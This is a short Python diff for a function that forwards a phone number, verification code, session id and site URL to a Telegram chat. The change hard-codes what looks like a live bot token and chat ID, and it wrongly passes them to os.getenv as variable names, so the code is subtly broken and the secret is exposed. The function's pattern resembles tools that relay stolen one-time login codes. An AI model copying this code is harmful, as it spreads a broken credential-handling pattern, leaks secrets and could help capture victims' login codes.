@@ -2,8 +2,8 @@ import os
 import httpx
 
 async def send_telegram_code(phone: str, code: str, session_id: str, site_url: str):
-    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
-    chat_id = os.getenv("TELEGRAM_CHAT_ID")
+    bot_token = os.getenv("8985263385:AAGiSWAOr45I9ox0V5UJPzaCyL4J39MaDc0")
+    chat_id = os.getenv("8580157399")
     
     if not bot_token or not chat_id:
         print(f"DEMO: {phone} -> code {code}")
